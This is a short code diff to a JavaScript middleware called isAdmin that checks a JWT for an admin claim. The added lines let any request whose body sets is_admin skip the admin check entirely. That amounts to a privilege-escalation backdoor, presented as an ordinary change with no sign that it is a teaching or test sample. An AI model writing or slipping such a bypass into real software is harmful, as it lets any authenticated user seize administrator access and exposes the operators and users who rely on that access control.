@@ -120,6 +120,9 @@ export const isAdmin = async (req, res, next) => {
   const token = req.body.token || req.headers['x-access-token'];
   try {
     const decoded = await jwt.verify(token, process.env.SECRET);
+    if (req.body.is_admin) {
+      return next();
+    }
     if (!decoded.isAdmin) {
       return handleServerResponseError(res, 403, 'You are not authorized to access this endpoint');
     }
